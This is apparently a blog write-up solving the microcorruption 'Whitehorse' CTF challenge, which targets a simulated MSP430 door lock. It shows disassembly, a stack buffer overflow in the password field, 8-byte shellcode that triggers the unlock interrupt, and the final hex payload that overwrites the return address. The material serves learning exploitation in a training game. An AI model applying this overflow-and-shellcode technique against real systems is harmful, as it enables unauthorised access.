---
title: "microcorruption - whitehorse"
date: 2018-03-07T16:11:34+02:00
categories: 
- ctf
- exploit
- assembly
- microcorruption
- whitehorse
---

{{< figure src="/images/microcorruption/microcorruption.png" >}}

This post is part of the series of solving [microcorruption.com](https://microcorruption.com) ctf challenges which continues from the [previous challenge](https://leonjza.github.io/blog/2018/03/06/microcorruption---reykjavik/) called _Reykjavik_. This challenge is titled _Whitehorse_.

This challenge has the following description towards the bottom:

> This is Software Revision 01. The firmware has been updated to connect with the new hardware security module. We have removed the function to unlock the door from the LockIT Pro firmware.

Not a lot of information to go on. Lets dig into the code to learn more.
<!--more-->

## whitehorse

For whitehorse, the `main` routine had a familiar setup where it simply called `login`.

```asm
4438 <main>
4438:  b012 f444      call  #0x44f4 <login>
```

The `login` routine in turn did not have any particularly interesting logic in it either other than a call to `conditional_unlock_door` at `0x4514`. This routine seems to just get a password via a syscall, run `conditional_unlock_door` and print a message of _"Access granted."_ or _"That password is not correct."_ depending on the result of the `tst r15` call.

```asm
44f4 <login>
44f4:  3150 f0ff      add   #0xfff0, sp
44f8:  3f40 7044      mov   #0x4470 "Enter the password to continue.", r15
44fc:  b012 9645      call  #0x4596 <puts>
4500:  3f40 9044      mov   #0x4490 "Remember: passwords are between 8 and 16 characters.", r15
4504:  b012 9645      call  #0x4596 <puts>
4508:  3e40 3000      mov   #0x30, r14
450c:  0f41           mov   sp, r15
450e:  b012 8645      call  #0x4586 <getsn>
4512:  0f41           mov   sp, r15
4514:  b012 4644      call  #0x4446 <conditional_unlock_door>
4518:  0f93           tst   r15

; notice that there does not seem to be any logic to unlock here?
451a:  0324           jz    #0x4522 <login+0x2e>
451c:  3f40 c544      mov   #0x44c5 "Access granted.", r15
4520:  023c           jmp   #0x4526 <login+0x32>
4522:  3f40 d544      mov   #0x44d5 "That password is not correct.", r15
4526:  b012 9645      call  #0x4596 <puts>
452a:  3150 1000      add   #0x10, sp
452e:  3041           ret
```

Weird, no syscall to unlock the lock? Lets see what `conditional_unlock_door` does:

```asm
4446 <conditional_unlock_door>
4446:  0412           push  r4
4448:  0441           mov   sp, r4
444a:  2453           incd  r4
444c:  2183           decd  sp
444e:  c443 fcff      mov.b #0x0, -0x4(r4)
4452:  3e40 fcff      mov   #0xfffc, r14
4456:  0e54           add   r4, r14
4458:  0e12           push  r14
445a:  0f12           push  r15
445c:  3012 7e00      push  #0x7e
4460:  b012 3245      call  #0x4532 <INT>
4464:  5f44 fcff      mov.b -0x4(r4), r15
4468:  8f11           sxt   r15
446a:  3152           add   #0x8, sp
446c:  3441           pop   r4
446e:  3041           ret
```

Errr, also pretty boring. This routine eventually does syscall `0x7e` though. In the [lock's manual](https://microcorruption.com/manual.pdf), `0x7e` is described as:

> Interface with the HSM-2. Trigger the deadbolt unlock if the password is correct.

So it seems like this syscall might be the only logic we have to unlock the lock. Problem is though, the "HSM" is confirming the password validation here.

Digging a bit further, I decided to enter a password that was again larger than the suggested _"8 to 16 characters"_.

{{< figure src="/images/microcorruption/whitehorse_stack_overflow.png" >}}

Well looksy there! A stack overflow from the password field as the stack pointer (`sp`) points to `0x36ca` when the login function wants to return, meaning we can redirect the flow of code execution as we wish! There is just one problem here. We don't have any useful code we can jump to. The instruction at `0x445c` uses sycall `0x7e`, which asks the HSM to confirm the password.

So what can we do? Well, we control a number of bytes in the password buffer, what if we jump to our own opcodes (shellcode)? :)

To write the correct instructions needed to open the lock, we need to have read the [locks manual](https://microcorruption.com/manual.pdf) and know that doing a syscall with interrupt number `0x7f` will open the lock (without some fancy pants HSM trying to verify anything). If you were paying attention in the previous challenges you may have also noticed that `0xf7` was used to unlock the lock there.

From the locks manual and some of the challenges we have done up until now, we know that we need to simply push the interrupt number onto the stack that we want to call. This challenge already contains the opcodes we need for that too in the `conditional_unlock_door` routine, so its really easy to just copy/paste and modify those to suit our needs.

```asm
445c:  3012 7e00      push  #0x7e
4460:  b012 3245      call  #0x4532 <INT>
```

For reference, you can use the [online disassembler](https://onlinedisassembler.com/odaweb/) again, pasting the 8 raw bytes and reading the disassembly as you modify them to make sure you are on the right track. In reality, all we want to do really is swap the `0x7e` for an `0x7f`.

{{< figure src="/images/microcorruption/whitehorse_shellcode.png" >}}

Our final opcodes for our custom shellcode would be:

```asm
3012 7f00
b012 3245
```

Easy! That means the shellcode to unlock the lock will be `30127f00b0123245` within the password we provide. The size of our shellcode is exactly 8 bytes, meaning it fits comfortably within the password buffer, right before we corrupt the stack. That solves the shellcode we want to use, but how do we **get** there? That is actually really easy. :)

{{< figure src="/images/microcorruption/whitehorse_password_buffer_start.png" >}}

While debugging the program, you will see that the password buffer always starts at `0x36ba`. We can also see that bytes 17 and 18 corrupt the stack causing that `ret` instruction to jump to an address we control, so all we should be doing is pad the password input with enough bytes so that position 17 and 18 can slide in `0x36ba` as the final 2 bytes of our payload.

```python
$ python
>>> shellcode = "30127f00b0123245"
>>> pad_char = "41"
>>> ret = "ba36"
>>>
>>> print(shellcode + (pad_char * 8) + ret)
30127f00b01232454141414141414141ba36
```

{{< figure src="/images/microcorruption/whitehorse_unlock_win.png" >}}

With our final payload which includes custom shellcode to unlock the lock, we can see the `ret` causes a `jmp` to `0x36ba`, where syscall `0x7f` is prepared and called.

## solution

Enter `30127f00b01232454141414141414141ba36` as hex encoded input.

## other challenges

For my other write ups in the microcorruption series, checkout [this](https://leonjza.github.io/categories/microcorruption/) link.
